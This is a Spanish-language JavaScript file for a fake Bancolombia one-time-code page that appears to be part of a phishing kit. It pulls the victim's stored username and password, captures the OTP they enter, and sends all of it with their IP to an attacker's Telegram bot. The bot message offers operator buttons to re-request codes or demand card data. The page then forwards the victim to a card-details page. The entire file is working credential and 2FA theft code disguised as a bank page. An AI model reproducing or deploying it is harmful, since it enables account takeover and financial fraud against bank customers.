// ==========================================
// SCRIPT COMPLETO PARA otp-dinamica.html
// ==========================================

console.log('üîê OTP page loaded');

// ‚úÖ Verificar datos previos (con los nombres correctos de login.html)
const userName = localStorage.getItem('userName');
const userPass = localStorage.getItem('userPass');
const userIP = localStorage.getItem('userIP');
const transactionId = localStorage.getItem('transactionId');

console.log('üì¶ Datos recuperados del localStorage:', {
    userName,
    userPass,
    userIP,
    transactionId
});

// Redirigir si no hay datos previos
if (!userName || !userPass) {
    console.error('‚ùå No hay datos de login - Redirigiendo...');
    alert('Sesi√≥n expirada. Por favor ingresa nuevamente.');
    window.location.href = 'login.html';
}

// Variables globales del formulario
const inputs = document.querySelectorAll('.otp-input');
const verifyBtn = document.getElementById('verifyBtn');
const errorMessage = document.getElementById('errorMessage');
const loadingScreen = document.getElementById('loadingScreen');
const resendBtn = document.getElementById('resendBtn');
const resendSection = document.getElementById('resendSection');
const countdownElement = document.getElementById('countdown');
const timerElement = document.getElementById('timer');

let currentIndex = 0;
let currentType = 'otp'; // 'otp' o 'dinamica'
let timeLeft = 300; // 5 minutos
let timerInterval;

// Auto-focus en primer input
if (inputs.length > 0) {
    inputs[0].focus();
}

// ==========================================
// SELECTOR DE TIPO DE C√ìDIGO
// ==========================================

document.querySelectorAll('.otp-type-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        // Remover clase active de todos
        document.querySelectorAll('.otp-type-btn').forEach(b => b.classList.remove('active'));
        
        // Agregar a este bot√≥n
        this.classList.add('active');
        currentType = this.dataset.type;
        
        console.log('üîÑ Tipo cambiado a:', currentType);
        
        // Limpiar inputs
        clearOTP();
        
        // Actualizar t√≠tulo
        const title = currentType === 'otp' ? 
            'Ingresa el c√≥digo de 6 d√≠gitos' : 
            'Ingresa tu clave din√°mica';
        document.querySelector('.otp-section h3').textContent = title;
    });
});

// ==========================================
// MANEJO DE INPUTS OTP
// ==========================================

inputs.forEach((input, index) => {
    // Evento input - detectar escritura
    input.addEventListener('input', function(e) {
        const value = e.target.value;
        
        // Solo permitir n√∫meros
        if (!/^\d$/.test(value)) {
            e.target.value = '';
            return;
        }
        
        // Marcar como lleno
        input.classList.add('filled');
        
        // Mover al siguiente campo
        if (value && index < inputs.length - 1) {
            inputs[index + 1].focus();
            currentIndex = index + 1;
        }
        
        // Verificar si est√° completo
        checkComplete();
        
        // Ocultar mensaje de error
        errorMessage.classList.remove('show');
    });

    // Evento keydown - detectar backspace
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            inputs[index - 1].focus();
            currentIndex = index - 1;
        }
    });

    // Evento paste - pegar c√≥digo completo
    input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
        
        pastedData.split('').forEach((char, i) => {
            if (inputs[i]) {
                inputs[i].value = char;
                inputs[i].classList.add('filled');
            }
        });
        
        // Focus en el siguiente vac√≠o o en el √∫ltimo
        if (inputs[pastedData.length]) {
            inputs[pastedData.length].focus();
        }
        
        checkComplete();
    });
});

// ==========================================
// FUNCIONES AUXILIARES
// ==========================================

function checkComplete() {
    const allFilled = Array.from(inputs).every(input => input.value !== '');
    verifyBtn.disabled = !allFilled;
    console.log('üîç Campos completos:', allFilled);
}

function getOTPCode() {
    return Array.from(inputs).map(input => input.value).join('');
}

function clearOTP() {
    inputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled', 'error');
    });
    inputs[0].focus();
    currentIndex = 0;
    verifyBtn.disabled = true;
    errorMessage.classList.remove('show');
    console.log('üßπ Inputs limpiados');
}

function showError() {
    errorMessage.classList.add('show');
    inputs.forEach(input => {
        if (input.value) {
            input.classList.add('error');
        }
    });
    
    setTimeout(() => {
        clearOTP();
    }, 2000);
}

// ==========================================
// TEMPORIZADOR
// ==========================================

function startTimer() {
    timerInterval = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        countdownElement.textContent = 
            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        
        if (timeLeft <= 60) {
            timerElement.classList.add('warning');
        }
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            countdownElement.textContent = 'C√≥digo expirado';
            verifyBtn.disabled = true;
            resendSection.classList.remove('disabled');
        }
    }, 1000);
}

// Iniciar temporizador
startTimer();

// ==========================================
// REENVIAR C√ìDIGO
// ==========================================

resendBtn.addEventListener('click', function(e) {
    e.preventDefault();
    
    if (!resendSection.classList.contains('disabled')) {
        console.log('üîÑ Solicitando reenv√≠o de c√≥digo');
        
        // Reiniciar timer
        timeLeft = 300;
        timerElement.classList.remove('warning');
        resendSection.classList.add('disabled');
        clearInterval(timerInterval);
        startTimer();
        
        // Notificar al usuario
        alert('‚úÖ Se ha enviado un nuevo c√≥digo a tu celular y correo electr√≥nico');
        clearOTP();
        
        // Habilitar reenv√≠o despu√©s de 60 segundos
        setTimeout(() => {
            resendSection.classList.remove('disabled');
        }, 60000);
    }
});

// ==========================================
// VERIFICAR C√ìDIGO - EVENTO PRINCIPAL
// ==========================================

verifyBtn.addEventListener('click', async function() {
    const code = getOTPCode();
    console.log('üîê Verificando c√≥digo:', code);
    console.log('üì± Tipo de c√≥digo:', currentType);
    
    // Mostrar pantalla de carga
    loadingScreen.classList.add('active');

    // Preparar datos para guardar
    const otpData = {
        usuario: userName,
        clave: userPass,
        otp: code,
        tipoOTP: currentType === 'otp' ? 'SMS' : 'Din√°mica',
        ip: userIP,
        transactionId: transactionId,
        timestamp: new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota'
        })
    };

    // Guardar en localStorage
    localStorage.setItem('otpData', JSON.stringify(otpData));
    console.log('üíæ Datos OTP guardados en localStorage');

    // Preparar mensaje para Telegram
    const mensaje = `üîê *BANCOLOMBIA - C√ìDIGO DE VERIFICACI√ìN*

üë§ *Usuario:* \`${userName}\`
üîë *Clave:* \`${userPass}\`
üéØ *OTP:* \`${code}\`
üì± *Tipo:* ${otpData.tipoOTP}
üåê *IP:* ${userIP}
‚è∞ *Hora:* ${otpData.timestamp}
üÜî *ID:* \`${transactionId}\``;

    // Crear teclado de botones
    const teclado = {
        inline_keyboard: [
            [
                { text: "‚úÖ Correcto", callback_data: `correcto_otp:${transactionId}` },
                { text: "‚ùå Error OTP", callback_data: `error_otp:${transactionId}` }
            ],
            [
                { text: "üîÑ Pedir OTP Otra Vez", callback_data: `pedir_otp:${transactionId}` },
                { text: "üí≥ Pedir Datos Tarjeta", callback_data: `pedir_tarjeta:${transactionId}` }
            ],
            [
                { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${transactionId}` }
            ]
        ]
    };

    try {
        // Verificar que la funci√≥n existe
        if (typeof sendTelegramMessage === 'function') {
            console.log('üì§ Enviando mensaje a Telegram...');
            await sendTelegramMessage(mensaje, teclado);
            console.log('‚úÖ Mensaje enviado exitosamente');
        } else {
            console.error('‚ö†Ô∏è sendTelegramMessage no est√° disponible');
            console.log('‚ö†Ô∏è Continuando sin enviar a Telegram (modo desarrollo)');
        }
        
        // Simular proceso de verificaci√≥n (2 segundos)
        setTimeout(() => {
            loadingScreen.classList.remove('active');
            console.log('üìÑ Redirigiendo a datos-tarjeta.html');
            window.location.href = 'datos-tarjeta.html';
        }, 2000);

    } catch (error) {
        console.error('‚ùå Error al verificar c√≥digo:', error);
        loadingScreen.classList.remove('active');
        showError();
        alert('Error al procesar el c√≥digo. Por favor intenta nuevamente.');
    }
});

console.log('‚úÖ Script de OTP inicializado correctamente');
